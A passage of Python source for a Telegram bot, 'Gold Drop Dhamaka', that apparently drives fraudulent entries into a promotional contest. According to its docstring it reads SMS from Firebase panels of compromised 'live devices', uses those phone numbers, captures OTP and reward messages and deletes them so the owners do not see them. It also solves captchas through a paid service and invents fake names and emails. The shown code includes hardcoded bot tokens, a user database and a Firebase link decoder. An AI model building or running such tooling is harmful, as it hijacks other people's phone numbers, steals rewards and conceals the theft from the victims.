#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  Gold Drop Dhamaka — All-in-One Automated Runner & Telegram Bot
  Upgraded Edition: Sequential Firebase Engine, Auto-Delete SMS, Full UI Controls
================================================================================
Features:
  1. Sequential Firebase & Device Processing:
     - Each Firebase panel runs one by one in exact order.
     - For each Firebase, all live devices run sequentially (Device 1 -> Device 2...).
     - Panel is marked complete ONLY after all its devices finish, then shifts to next.
  2. Firebase Auto-Detection & Auto-Delete:
     - Online live device extraction with Dead-Number filter (<= 5 msgs skipped).
     - OTP SMS auto-detected and safely deleted from Firebase immediately.
     - BigCity Reward SMS watched in background, captured, and safely auto-deleted.
  3. Smart Multi-Format Firebase Importer:
     - Add via Single Link, Bulk text (newlines/commas/spaces), or .txt file upload.
     - Advanced regex & base64 (?s=...) decoder extracts & normalizes clean URLs.
  4. Firebase Manager:
     - View list of panels with pagination.
     - Individual delete button for each Firebase panel (❌ Del #X).
     - "Clear All Firebases" button with confirmation.
     - "Back to Main Menu" button on every screen.
  5. Scan Controls:
     - Start Scan & Stop Scan buttons in Telegram bot.
  6. Live Status & Real-time Logs:
     - Live Dashboard with current panel, active phone, step indicator, and session stats.
     - Real-time rolling activity log (last 8-10 events).
     - Inline [🔄 Refresh Logs] button to update in place.
  7. In-Memory Base64 Image Support:
     - Upload photo to chat or paste Base64 to set image for form submission.
     - Works without needing a photo file on disk.
  8. CLI / Terminal Mode:
     - Run with python3 gold_drop.py --cli or python3 gold_drop.py <phone>
"""

import os
import sys
import re
import json
import time
import base64
import hashlib
import hmac
import string
import random
import sqlite3
import threading
import argparse
from datetime import datetime
from collections import Counter, deque
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
#  USER CONFIGURATION
# ============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8841449465:AAGqnW1Ygw9le40mVME1d4uQ1aDmxUsYkSc")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8083076438")
ALERT_BOT_TOKEN = os.environ.get("ALERT_BOT_TOKEN", "8610331125:AAFq7mRIOMrD3e7ONlm0ISvDSCEtZYTImA0")
ALERT_CHAT_ID = os.environ.get("ALERT_CHAT_ID", "8083076438")
BATCH_CODE = os.environ.get("BATCH_CODE", "KKD2LS01261026")
# Browser & Captcha Automation Settings
HEADLESS = os.environ.get("HEADLESS", "false").lower() in ("true", "1", "yes")
USE_BROWSER = os.environ.get("USE_BROWSER", "true").lower() in ("true", "1", "yes")

# SolverCF & Cloudflare Turnstile Settings
DEFAULT_SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGE1rl5Luu7yDEl0")
CAPTCHA_KEYS_FILE = "captcha_keys.json"
SOLVERCF_CREATE_URL = "https://solvercf.com/token/extension/createTask"
SOLVERCF_RESULT_URL = "https://solvercf.com/token/extension/getTaskResult"
SOLVERCF_BALANCE_URL = "https://solvercf.com/token/extension/getBalance"
_captcha_keys_lock = threading.Lock()


BASE_URL = os.environ.get("SITE", "https://golddropgolddhamaka.com")
PINCODE = os.environ.get("PINCODE", "500001")

OTP_TIMEOUT = int(os.environ.get("OTP_TIMEOUT", "60"))
OTP_POLL_INTERVAL = 1
REWARD_SMS_TIMEOUT = 300
REWARD_SMS_POLL_INTERVAL = 1
MIN_FIREBASE_MSGS = 2

REWARD_SMS_HINTS = (
    "vm-bgcity", "bgcity", "golddropwins.com",
    "reward code", "reward_code", "rewardcode", "voucher", "congratulations"
)

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = str(BASE_DIR / "golddrop.db")
PANELS_FILE = str(BASE_DIR / "golddrop_panels.json")
BIGCITY_REWARDS_FILE = str(BASE_DIR / "bigcity_rewards.json")
B64_CACHE_FILE = BASE_DIR / "image_base64.txt"
PHOTO_FILE = BASE_DIR / "photo.jpg"
B64_CACHE_FILE = BASE_DIR / "base64_cache.txt"
IMAGE_URL_FILE = BASE_DIR / "image_url.txt"
IMAGE_URL = os.environ.get("IMAGE_URL", "").strip()
IMAGE_BASE64 = os.environ.get("IMAGE_BASE64", "").strip()
ACTIVE_BASE64 = IMAGE_BASE64

IMAGE_BASE64 = os.environ.get("IMAGE_BASE64", "").strip()
ACTIVE_BASE64 = IMAGE_BASE64

if not ACTIVE_BASE64 and B64_CACHE_FILE.exists():
    try:
        cached_val = B64_CACHE_FILE.read_text(encoding="utf-8").strip()
        if cached_val:
            ACTIVE_BASE64 = cached_val
    except Exception:
        pass

ADMIN_IDS = {int(x) for x in re.split(r"[,\s]+", ADMIN_CHAT_ID) if x.strip().lstrip("-").isdigit()}

_print_lock = threading.Lock()
_db_lock = threading.Lock()
_panels_lock = threading.Lock()
_log_lock = threading.Lock()
_runner_lock = threading.Lock()

MAX_LOG_ENTRIES = 40
_activity_logs = deque(maxlen=MAX_LOG_ENTRIES)
_user_activity_logs = {}

class RunnerStatus:
    def __init__(self):
        self.is_running = False
        self.chat_id = None
        self.current_panel_idx = 0
        self.total_panels = 0
        self.current_panel_url = ""
        self.current_device_idx = 0
        self.total_devices = 0
        self.current_phone = ""
        self.current_step = "Idle"
        self.started_at = 0.0
        self.today_success = 0

runner_status = RunnerStatus()
_user_runners = {}
_stop_events = {}
_manual_sessions = {}

def get_user_runner(uid):
    u_key = str(uid)
    if u_key not in _user_runners:
        _user_runners[u_key] = RunnerStatus()
    return _user_runners[u_key]

def log(msg, color=None):
    colors = {
        "blue": "[94m", "green": "[92m", "yellow": "[93m",
        "red": "[91m", "cyan": "[96m", "magenta": "[95m", "reset": "[0m"
    }
    c = colors.get(color, "")
    r = colors["reset"] if c else ""
    t_str = datetime.now().strftime("%H:%M:%S")
    with _print_lock:
        print(f"{c}[{t_str}] {msg}{r}", flush=True)

def add_log(msg, uid=None):
    t_str = datetime.now().strftime("%H:%M:%S")
    entry = f"{t_str} | {msg}"
    with _log_lock:
        _activity_logs.append(entry)
        if uid is not None:
            u_key = str(uid)
            if u_key not in _user_activity_logs:
                _user_activity_logs[u_key] = deque(maxlen=MAX_LOG_ENTRIES)
            _user_activity_logs[u_key].append(entry)
    log(msg, "cyan")

def get_recent_logs(count=8, uid=None):
    with _log_lock:
        if uid is not None and str(uid) in _user_activity_logs:
            logs = list(_user_activity_logs[str(uid)])
        elif uid is not None:
            logs = []
        else:
            logs = list(_activity_logs)
    if not logs:
        return ["(No activity logs recorded yet)"]
    return logs[-count:]

def send_alert_bot(text, chat_id=None):
    target_chat = str(chat_id or ALERT_CHAT_ID or ADMIN_CHAT_ID).strip()
    token = (ALERT_BOT_TOKEN or BOT_TOKEN).strip()
    if not token or not target_chat:
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": target_chat,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            },
            timeout=12,
            verify=False
        )
        return r.status_code == 200
    except Exception as e:
        log(f"Alert bot send failed: {e}", "red")
        return False

FIRST_NAMES = [
    "Aarav", "Rohan", "Rahul", "Amit", "Pooja", "Anjali", "Neha", "Vikas",
    "Suresh", "Priya", "Deepak", "Sneha", "Kunal", "Sunil", "Manish",
    "Rajesh", "Kavita", "Sanjay", "Ankit", "Divya", "Rohit", "Vikram",
    "Preeti", "Alok", "Naveen", "Megha", "Shweta", "Mohit", "Tarun", "Kiran",
    "Arjun", "Vijay", "Swati", "Mounika", "Srikar", "Venkat", "Sai", "Teja"
]
LAST_NAMES = [
    "Sharma", "Verma", "Kumar", "Singh", "Yadav", "Patel", "Gupta", "Mishra",
    "Reddy", "Rao", "Joshi", "Das", "Chauhan", "Pandey", "Mehta", "Bose",
    "Naidu", "Chowdary", "Goud", "Dasari"
]

def generate_random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    full_name = f"{first} {last}"
    num = random.randint(100, 99999)
    domain = random.choice(["gmail.com", "yahoo.com", "outlook.com"])
    clean_first = first.lower().replace(" ", "")
    clean_last = last.lower().replace(" ", "")
    email = f"{clean_first}{clean_last}{num}@{domain}"
    return full_name, email

def clean_base64(raw_str):
    raw_str = raw_str.strip()
    if "," in raw_str and "base64" in raw_str[:60]:
        raw_str = raw_str.split(",", 1)[1]
    return "".join(raw_str.split())

USER_DATA_DIR = BASE_DIR / "user_data"
USER_DATA_DIR.mkdir(exist_ok=True)

def _user_dir(uid="default"):
    u_key = re.sub(r"[^a-zA-Z0-9_-]", "", str(uid or "default")) or "default"
    d = USER_DATA_DIR / u_key
    d.mkdir(exist_ok=True)
    return d

def save_user_photo_bytes(data_bytes: bytes, uid="default"):
    ud = _user_dir(uid)
    p_file = ud / "photo.jpg"
    b_file = ud / "base64_cache.txt"
    p_file.write_bytes(data_bytes)
    b64_str = base64.b64encode(data_bytes).decode("ascii")
    b_file.write_text(b64_str, encoding="utf-8")
    return round(len(data_bytes) / 1024, 1), b64_str

def save_user_base64_str(b64_raw: str, uid="default"):
    cleaned = clean_base64(b64_raw)
    decoded = base64.b64decode(cleaned)
    if len(decoded) <= 50:
        raise ValueError("Image data too small")
    ud = _user_dir(uid)
    (ud / "photo.jpg").write_bytes(decoded)
    (ud / "base64_cache.txt").write_text(cleaned, encoding="utf-8")
    return round(len(decoded) / 1024, 1), cleaned

def fetch_image_from_url(url: str, uid="default"):
    """Downloads an image from any image hosting site and saves it per user."""
    if not url or not str(url).startswith("http"):
        return False
    ud = _user_dir(uid)
    p_file = ud / "photo.jpg"
    u_file = ud / "image_url.txt"
    try:
        r = requests.get(url.strip(), timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200 and len(r.content) > 50:
            p_file.write_bytes(r.content)
            u_file.write_text(url.strip(), encoding="utf-8")
            log(f"✅ Image downloaded from URL ({round(len(r.content)/1024, 1)} KB) -> saved for user {uid}", "green")
            return True
    except Exception as e:
        log(f"❌ Failed to fetch image from URL {url}: {e}", "red")
    return False

def get_active_image_payload(uid="default"):
    """
    Returns per-user image payload for browser / HTTP submission:
    Priority:
    1. User's photo.jpg on disk
    2. User's saved image_url.txt or env IMAGE_URL
    3. User's base64_cache.txt
    """
    ud = _user_dir(uid)
    p_file = ud / "photo.jpg"
    b_file = ud / "base64_cache.txt"
    u_file = ud / "image_url.txt"

    if p_file.exists():
        try:
            data = p_file.read_bytes()
            if len(data) > 50:
                return {
                    "type": "path",
                    "path": str(p_file),
                    "buffer": data,
                    "name": "photo.jpg",
                    "mimeType": "image/jpeg",
                    "size_kb": round(len(data) / 1024, 1),
                    "source": f"user:{uid}/photo.jpg"
                }
        except Exception:
            pass

    url_to_try = ""
    if u_file.exists():
        try:
            url_to_try = u_file.read_text(encoding="utf-8").strip()
        except Exception:
            pass
    if not url_to_try and IMAGE_URL:
        url_to_try = IMAGE_URL

    if url_to_try:
        if fetch_image_from_url(url_to_try, uid=uid) and p_file.exists():
            data = p_file.read_bytes()
            return {
                "type": "path",
                "path": str(p_file),
                "buffer": data,
                "name": "photo.jpg",
                "mimeType": "image/jpeg",
                "size_kb": round(len(data) / 1024, 1),
                "source": f"URL ({url_to_try[:30]}...)"
            }

    if b_file.exists():
        try:
            b64_str = b_file.read_text(encoding="utf-8").strip()
            if b64_str:
                cleaned = clean_base64(b64_str)
                decoded_bytes = base64.b64decode(cleaned)
                if len(decoded_bytes) > 50:
                    try:
                        p_file.write_bytes(decoded_bytes)
                    except Exception:
                        pass
                    return {
                        "type": "buffer",
                        "buffer": decoded_bytes,
                        "path": str(p_file) if p_file.exists() else None,
                        "name": "photo.jpg",
                        "mimeType": "image/jpeg",
                        "size_kb": round(len(decoded_bytes) / 1024, 1),
                        "source": f"user:{uid}/base64_cache.txt"
                    }
        except Exception:
            pass

    return None

FINAL_STATUSES = ("success", "verified_no_reward")

def init_db():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("PRAGMA journal_mode=WAL")
        c.execute("""CREATE TABLE IF NOT EXISTS processed (
            phone TEXT PRIMARY KEY,
            status TEXT, reward TEXT, win_type TEXT,
            panel_url TEXT, otp TEXT, ts REAL)""")
        c.execute("""CREATE TABLE IF NOT EXISTS bot_users (
            user_id TEXT PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            is_banned INTEGER DEFAULT 0,
            scans_count INTEGER DEFAULT 0,
            referred_by TEXT DEFAULT '',
            pending_referrer TEXT DEFAULT '',
            captcha_verified INTEGER DEFAULT 0,
            referrals_count INTEGER DEFAULT 0,
            points INTEGER DEFAULT 0,
            last_seen REAL)""")
        c.execute("""CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            title TEXT,
            invite_link TEXT,
            added_at REAL)""")
        for col_sql in (
            "ALTER TABLE bot_users ADD COLUMN referred_by TEXT DEFAULT ''",
            "ALTER TABLE bot_users ADD COLUMN pending_referrer TEXT DEFAULT ''",
            "ALTER TABLE bot_users ADD COLUMN captcha_verified INTEGER DEFAULT 0",
            "ALTER TABLE bot_users ADD COLUMN referrals_count INTEGER DEFAULT 0",
            "ALTER TABLE bot_users ADD COLUMN points INTEGER DEFAULT 0"
        ):
            try:
                c.execute(col_sql)
            except Exception:
                pass
        c.commit()
        c.close()

def register_bot_user(uid, username="", first_name="", ref_by=""):
    uid = str(uid)
    uname = (username or "").lstrip("@")
    fname = first_name or ""
    now = time.time()
    is_new_user = False
    valid_referrer = ""
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT user_id, referred_by, pending_referrer, captcha_verified FROM bot_users WHERE user_id=?", (uid,)).fetchone()
        if row:
            c.execute("UPDATE bot_users SET username=?, first_name=?, last_seen=? WHERE user_id=?",
                      (uname, fname, now, uid))
            existing_ref = str(row[1] or "")
            existing_pend = str(row[2] or "")
            if not existing_ref and not existing_pend and ref_by:
                ref_clean = str(ref_by).strip()
                if ref_clean and ref_clean != uid and ref_clean.isdigit():
                    ref_row = c.execute("SELECT user_id FROM bot_users WHERE user_id=?", (ref_clean,)).fetchone()
                    if ref_row:
                        c.execute("UPDATE bot_users SET pending_referrer=? WHERE user_id=?", (ref_clean, uid))
                        valid_referrer = ref_clean
        else:
            is_new_user = True
            ref_clean = str(ref_by or "").strip()
            if ref_clean and ref_clean != uid and ref_clean.isdigit():
                ref_row = c.execute("SELECT user_id FROM bot_users WHERE user_id=?", (ref_clean,)).fetchone()
                if ref_row:
                    valid_referrer = ref_clean
            c.execute("""INSERT INTO bot_users
                         (user_id, username, first_name, is_banned, scans_count, referred_by, pending_referrer, captcha_verified, referrals_count, points, last_seen)
                         VALUES (?, ?, ?, 0, 0, '', ?, 0, 0, 0, ?)""",
                      (uid, uname, fname, valid_referrer, now))
        c.commit()
        c.close()
    return is_new_user, valid_referrer

def is_user_captcha_verified(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT captcha_verified FROM bot_users WHERE user_id=?", (uid,)).fetchone()
        c.close()
    return bool(row and row[0] == 1)

def mark_user_captcha_verified(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("UPDATE bot_users SET captcha_verified=1 WHERE user_id=?", (uid,))
        c.commit()
        c.close()

def get_pending_referrer(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT pending_referrer, referred_by FROM bot_users WHERE user_id=?", (uid,)).fetchone()
        c.close()
    if not row:
        return ""
    return str(row[0] or row[1] or "")

def activate_referral_after_captcha(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT referred_by, pending_referrer FROM bot_users WHERE user_id=?", (uid,)).fetchone()
        ref_id = str((row[0] if row and row[0] else (row[1] if row else "")) or "")
        if ref_id and ref_id != uid:
            c.execute("UPDATE bot_users SET referred_by=?, pending_referrer='' WHERE user_id=?", (ref_id, uid))
        c.commit()
        c.close()
    return ref_id

def deduct_point_on_otp_verified(uid):
    """
    Deducts 1 point from the user's balance when an OTP is verified (1 Firebase scan OTP verify = -1 point).
    Admins are exempt from point deduction.
    Returns (deducted: bool, remaining_points: int).
    """
    u_key = str(uid or "").strip()
    if not u_key or u_key == "default":
        return False, 0
    try:
        if int(u_key) in ADMIN_IDS:
            prof = get_user_profile(u_key)
            return False, int(prof[7]) if prof else 0
    except Exception:
        pass
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT points FROM bot_users WHERE user_id=?", (u_key,)).fetchone()
        if not row:
            c.close()
            return False, 0
        cur_pts = int(row[0] or 0)
        if cur_pts <= 0:
            c.close()
            return False, 0
        new_pts = max(0, cur_pts - 1)
        c.execute("UPDATE bot_users SET points=? WHERE user_id=?", (new_pts, u_key))
        c.commit()
        c.close()
    return True, new_pts

def has_sufficient_points(uid):
    u_key = str(uid or "").strip()
    try:
        if int(u_key) in ADMIN_IDS:
            return True, 999999
    except Exception:
        pass
    prof = get_user_profile(u_key)
    pts = int(prof[7] or 0) if prof else 0
    return (pts >= 1), pts

def credit_referral(referrer_uid, bonus_points=1):
    referrer_uid = str(referrer_uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("""UPDATE bot_users
                     SET referrals_count = COALESCE(referrals_count, 0) + 1,
                         points = COALESCE(points, 0) + ?
                     WHERE user_id=?""", (int(bonus_points), referrer_uid))
        row = c.execute("SELECT referrals_count, points FROM bot_users WHERE user_id=?", (referrer_uid,)).fetchone()
        c.commit()
        c.close()
    return (row[0], row[1]) if row else (0, 0)

def adjust_user_credits(target_uid, delta_points):
    t_uid = str(target_uid).strip()
    delta = int(delta_points)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("""INSERT OR IGNORE INTO bot_users
                     (user_id, username, first_name, is_banned, scans_count, referred_by, pending_referrer, captcha_verified, referrals_count, points, last_seen)
                     VALUES (?, '', '', 0, 0, '', '', 0, 0, 0, ?)""",
                  (t_uid, time.time()))
        c.execute("""UPDATE bot_users
                     SET points = MAX(0, COALESCE(points, 0) + ?)
                     WHERE user_id=?""", (delta, t_uid))
        row = c.execute("SELECT points FROM bot_users WHERE user_id=?", (t_uid,)).fetchone()
        c.commit()
        c.close()
    return int(row[0]) if row else 0

def get_user_profile(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("""SELECT user_id, username, first_name, is_banned, scans_count, referred_by, referrals_count, points
                           FROM bot_users WHERE user_id=?""", (uid,)).fetchone()
        c.close()
    return row

def get_top_referrers(limit=10):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        rows = c.execute("""SELECT user_id, username, first_name, referrals_count, points
                            FROM bot_users
                            WHERE COALESCE(referrals_count, 0) > 0 OR COALESCE(points, 0) > 0
                            ORDER BY points DESC, referrals_count DESC LIMIT ?""", (limit,)).fetchall()
        c.close()
    return rows

def increment_user_scan(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("UPDATE bot_users SET scans_count = COALESCE(scans_count, 0) + 1 WHERE user_id=?", (uid,))
        c.commit()
        c.close()

def set_user_ban(uid, banned: bool):
    uid = str(uid).strip()
    val = 1 if banned else 0
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("""INSERT OR IGNORE INTO bot_users
                     (user_id, username, first_name, is_banned, scans_count, referred_by, pending_referrer, captcha_verified, referrals_count, points, last_seen)
                     VALUES (?, '', '', ?, 0, '', '', 0, 0, 0, ?)""",
                  (uid, val, time.time()))
        c.execute("UPDATE bot_users SET is_banned=? WHERE user_id=?", (val, uid))
        c.commit()
        c.close()

def is_user_banned(uid):
    uid = str(uid)
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT is_banned FROM bot_users WHERE user_id=?", (uid,)).fetchone()
        c.close()
    return bool(row and row[0] == 1)

def get_all_bot_users():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        rows = c.execute("""SELECT user_id, username, first_name, is_banned, scans_count, referrals_count, points, last_seen
                            FROM bot_users ORDER BY last_seen DESC""").fetchall()
        c.close()
    return rows

def get_setting(key, default_val):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT value FROM bot_settings WHERE key=?", (key,)).fetchone()
        c.close()
    return row[0] if row else default_val

def set_setting(key, val):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)", (key, str(val)))
        c.commit()
        c.close()

def reset_processed_db():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("DELETE FROM processed")
        c.commit()
        c.close()

def get_required_channels():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        rows = c.execute("SELECT channel_id, title, invite_link FROM required_channels ORDER BY added_at ASC").fetchall()
        c.close()
    return rows

def add_required_channel(channel_id, title="", invite_link=""):
    cid = str(channel_id).strip()
    if cid.startswith("https://t.me/") or cid.startswith("http://t.me/") or cid.startswith("t.me/"):
        slug = cid.rstrip("/").split("/")[-1].lstrip("@")
        if not slug.startswith("+"):
            cid = f"@{slug}"
    elif not cid.startswith("@") and not cid.lstrip("-").isdigit():
        cid = f"@{cid}"
    if not invite_link:
        if cid.startswith("@"):
            invite_link = f"https://t.me/{cid.lstrip('@')}"
        else:
            invite_link = "https://t.me/"
    if not title:
        title = cid
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("INSERT OR REPLACE INTO required_channels (channel_id, title, invite_link, added_at) VALUES (?, ?, ?, ?)",
                  (cid, title, invite_link, time.time()))
        c.commit()
        c.close()
    return cid

def remove_required_channel(channel_id):
    cid = str(channel_id).strip()
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        cur = c.execute("DELETE FROM required_channels WHERE channel_id=?", (cid,))
        deleted = cur.rowcount
        c.commit()
        c.close()
    return deleted > 0

def clear_required_channels():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("DELETE FROM required_channels")
        c.commit()
        c.close()

def should_skip_phone(phone, uid="default"):
    u_key = str(uid or "default")
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        try:
            c.execute("ALTER TABLE processed ADD COLUMN user_id TEXT DEFAULT 'default'")
            c.commit()
        except Exception:
            pass
        row = c.execute("SELECT status FROM processed WHERE phone=? AND COALESCE(user_id, 'default')=?", (phone, u_key)).fetchone()
        c.close()
    return bool(row) and row[0] in FINAL_STATUSES

def blocked_phones(uid="default"):
    u_key = str(uid or "default")
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        try:
            c.execute("ALTER TABLE processed ADD COLUMN user_id TEXT DEFAULT 'default'")
            c.commit()
        except Exception:
            pass
        rows = c.execute("SELECT phone, status FROM processed WHERE COALESCE(user_id, 'default')=?", (u_key,)).fetchall()
        c.close()
    return {phone for phone, status in rows if status in FINAL_STATUSES}

def save_processed(phone, status, reward="", win_type="", panel_url="", otp="", uid="default"):
    u_key = str(uid or "default")
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        try:
            c.execute("ALTER TABLE processed ADD COLUMN user_id TEXT DEFAULT 'default'")
        except Exception:
            pass
        c.execute("DELETE FROM processed WHERE phone=? AND COALESCE(user_id, 'default')=?", (phone, u_key))
        try:
            c.execute("""INSERT INTO processed
                         (phone, status, reward, win_type, panel_url, otp, ts, user_id)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                      (phone, status, str(reward), str(win_type),
                       panel_url, otp, time.time(), u_key))
        except sqlite3.IntegrityError:
            c.execute("DELETE FROM processed WHERE phone=?", (phone,))
            c.execute("""INSERT OR REPLACE INTO processed
                         (phone, status, reward, win_type, panel_url, otp, ts, user_id)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                      (phone, status, str(reward), str(win_type),
                       panel_url, otp, time.time(), u_key))
        c.commit()
        c.close()

def stats_summary(uid=None):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        try:
            c.execute("ALTER TABLE processed ADD COLUMN user_id TEXT DEFAULT 'default'")
        except Exception:
            pass
        if uid is not None:
            u_key = str(uid)
            total = c.execute("SELECT COUNT(*) FROM processed WHERE COALESCE(user_id, 'default')=?", (u_key,)).fetchone()[0]
            succ = c.execute("SELECT COUNT(*) FROM processed WHERE status='success' AND COALESCE(user_id, 'default')=?", (u_key,)).fetchone()[0]
            verified_no = c.execute("SELECT COUNT(*) FROM processed WHERE status='verified_no_reward' AND COALESCE(user_id, 'default')=?", (u_key,)).fetchone()[0]
            rewards = c.execute("SELECT COUNT(*) FROM processed WHERE reward<>'' AND reward IS NOT NULL AND COALESCE(user_id, 'default')=?", (u_key,)).fetchone()[0]
        else:
            total = c.execute("SELECT COUNT(*) FROM processed").fetchone()[0]
            succ = c.execute("SELECT COUNT(*) FROM processed WHERE status='success'").fetchone()[0]
            verified_no = c.execute("SELECT COUNT(*) FROM processed WHERE status='verified_no_reward'").fetchone()[0]
            rewards = c.execute("SELECT COUNT(*) FROM processed WHERE reward<>'' AND reward IS NOT NULL").fetchone()[0]
        c.close()
    return total, succ, rewards, verified_no

def recent_phones(limit=15, uid=None):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        try:
            c.execute("ALTER TABLE processed ADD COLUMN user_id TEXT DEFAULT 'default'")
        except Exception:
            pass
        if uid is not None:
            rows = c.execute("""SELECT phone, status, reward, ts FROM processed
                                WHERE COALESCE(user_id, 'default')=?
                                ORDER BY ts DESC LIMIT ?""", (str(uid), limit)).fetchall()
        else:
            rows = c.execute("""SELECT phone, status, reward, ts FROM processed
                                ORDER BY ts DESC LIMIT ?""", (limit,)).fetchall()
        c.close()
    return rows

def _load_panels():
    with _panels_lock:
        if os.path.exists(PANELS_FILE):
            try:
                with open(PANELS_FILE, "r", encoding="utf-8") as f:
                    return json.load(f).get("user_panels", {})
            except Exception:
                pass
        return {}

def _save_panels(data):
    with _panels_lock:
        try:
            with open(PANELS_FILE, "w", encoding="utf-8") as f:
                json.dump({"user_panels": data, "updated_at": time.time()}, f, indent=2)
        except Exception as e:
            log(f"Error saving panels file: {e}", "red")

def add_panel(uid, url):
    uid = str(uid)
    d = _load_panels()
    d.setdefault(uid, [])
    if any(p["url"] == url for p in d[uid] if not p.get("processed")):
        return False
    panel_entry = {
        "id": int(time.time() * 1000) + random.randint(10, 999),
        "url": url,
        "added_at": time.time(),
        "processed": False
    }
    d[uid].append(panel_entry)
    _save_panels(d)
    return True

def get_all_panels(uid):
    uid = str(uid)
    d = _load_panels()
    return d.get(uid, [])

def get_pending_panels(uid):
    uid = str(uid)
    d = _load_panels()
    return [p for p in d.get(uid, []) if not p.get("processed")]

def mark_panel_processed(uid, pid):
    uid = str(uid)
    d = _load_panels()
    changed = False
    for p in d.get(uid, []):
        if p.get("id") == pid:
            p["processed"] = True
            p["processed_at"] = time.time()
            changed = True
            break
    if changed:
        _save_panels(d)
    return changed

def delete_single_panel(uid, pid):
    uid = str(uid)
    d = _load_panels()
    if uid in d:
        before_count = len(d[uid])
        d[uid] = [p for p in d[uid] if p.get("id") != pid]
        if len(d[uid]) < before_count:
            _save_panels(d)
            return True
    return False

def clear_all_panels(uid):
    uid = str(uid)
    d = _load_panels()
    if uid in d:
        d[uid] = []
        _save_panels(d)
        return True
    return False

def panel_counts(uid):
    uid = str(uid)
    d = _load_panels()
    user_list = d.get(uid, [])
    total = len(user_list)
    pending = sum(1 for p in user_list if not p.get("processed"))
    return total, pending

def clean_and_normalize_firebase(host_or_url):
    if not host_or_url:
        return None
    m = re.search(r"([a-zA-Z0-9][a-zA-Z0-9\-]{1,63}\.(?:firebaseio\.com|firebasedatabase\.app))", host_or_url, re.I)
    if not m:
        return None
    domain = m.group(1).lower()
    return f"https://{domain}/"

def parse_firebase_url(link):
    if not link:
        return None
    link = str(link).strip()

    if "s=" in link:
        qs_matches = re.findall(r"[?&]s=([a-zA-Z0-9+/=]+)", link)
        for enc in qs_matches:
            try:
                enc += "=" * (-len(enc) % 4)
                dec = base64.b64decode(enc).decode("utf-8", errors="ignore").split("|")[0].strip()
                res = clean_and_normalize_firebase(dec)
                if res:
                    return res
            except Exception:
                pass

    if len(link) >= 16 and not link.startswith("http") and re.match(r"^[a-zA-Z0-9+/=]+$", link):
        try:
            pad = link + "=" * (-len(link) % 4)
            dec = base64.b64decode(pad).decode("utf-8", errors="ignore").split("|")[0].strip()
            res = clean_and_normalize_firebase(dec)
            if res:
                return res
        except Exception:
            pass

    return clean_and_normalize_firebase(link)

def extract_and_filter_firebase_urls(raw_text):
    if not raw_text:
        return []
    results = set()

    for m in re.finditer(r"(?:[?&]s=|\bs=)([a-zA-Z0-9+/=]{10,})", raw_text):
        enc = m.group(1).strip()
        try:
            enc += "=" * (-len(enc) % 4)
            dec = base64.b64decode(enc).decode("utf-8", errors="ignore").split("|")[0].strip()
            u = clean_and_normalize_firebase(dec)
            if u:
                results.add(u)
        except Exception:
            pass

    pat = re.compile(r"([a-zA-Z0-9][a-zA-Z0-9\-]{1,63}\.(?:firebaseio\.com|firebasedatabase\.app))", re.I)
    for m in pat.finditer(raw_text):
        u = clean_and_normalize_firebase(m.group(1))
        if u:
            results.add(u)

    for line in raw_text.splitlines():
        line = line.strip()
        if not line:
            continue
